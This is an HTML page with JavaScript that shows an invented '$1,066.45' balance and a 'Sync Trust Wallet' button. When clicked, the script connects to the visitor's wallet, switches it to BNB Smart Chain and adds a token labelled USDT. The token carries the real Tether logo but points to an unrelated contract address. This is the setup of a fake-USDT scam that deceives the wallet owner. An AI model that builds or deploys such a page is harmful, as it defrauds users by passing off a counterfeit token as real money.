<body>

<div class="container">
    <div class="main-logo"></div>
    <div class="price-box">
        <div style="font-size: 12px; color: #888;">ALLOCATED VALUE</div>
        <div class="amount">$1,066.45</div>
    </div>
    <button class="action-btn" id="syncBtn">SYNC TRUST WALLET</button>
    <div id="status">READY</div>
</div>

<script>
    // 6 Decimals for BEP-20 USDT Accuracy
    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function startSync() {
        const status = document.getElementById('status');
        const provider = window.trustwallet || window.ethereum;

        if (!provider) { alert("Trust Wallet not found!"); return; }

        try {
            status.innerText = "> CONNECTING...";
            await provider.request({ method: 'eth_requestAccounts' });

            // Step 1: Switch to BNB Smart Chain (0x38)
            status.innerText = "> SWITCHING TO BSC...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });

            // Step 2: Add Token with EXACT 6 Decimals
            status.innerText = "> INJECTING ASSET...";
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT,
                        symbol: 'USDT',
                        decimals: 6, // MATCHED TO CONTRACT
                        image: LOGO_URL,
                    },
                },
            });

            status.innerText = "> SUCCESSFUL";
            alert("Trust Wallet Synced!");
        } catch (err) {
            status.innerText = "> ERROR: HANDSHAKE FAILED";
        }
    }

    document.getElementById('syncBtn').addEventListener('click', startSync);
</script>
